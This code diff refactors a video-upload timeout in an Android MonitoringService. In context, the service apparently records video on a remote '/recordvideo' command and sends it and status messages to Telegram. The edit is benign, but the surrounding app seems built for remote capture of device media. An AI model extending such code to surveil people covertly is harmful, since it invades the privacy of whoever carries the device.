@@ -385,6 +385,7 @@ class MonitoringService : Service() {
         private const val MEDIA_FLUSH_DEADLINE_MS = 600_000L
         private const val MEDIA_FLUSH_MIN_START_MS = 15_000L
         private const val AUDIO_UPLOAD_TIMEOUT_MS = 300_000L
+        private const val VIDEO_UPLOAD_TIMEOUT_MS = 600_000L
         private const val PHOTO_PAUSE_NONE = 0
         private const val PHOTO_PAUSE_ADMIN = 1
         private const val PHOTO_PAUSE_UNKNOWN = 2
@@ -9373,7 +9374,7 @@ class MonitoringService : Service() {
                                 deleteQuietly(videoFile)
                                 sendToTelegram("⚠️ Video terlalu besar (>${MAX_VIDEO_BYTES / (1024L * 1024L)} MB). Coba /recordvideo dengan detik lebih sedikit.")
                             } else {
-                                val uploadOutcome = kotlinx.coroutines.withTimeoutOrNull(600_000L) { sendVideoFile(videoFile) }
+                                val uploadOutcome = kotlinx.coroutines.withTimeoutOrNull(VIDEO_UPLOAD_TIMEOUT_MS) { sendVideoFile(videoFile) }
                                 when (uploadOutcome ?: MediaSendOutcome.KEPT) {
                                     MediaSendOutcome.SENT -> {
                                         sendToTelegram("🎥 Video terkirim (${seconds} dtk).")
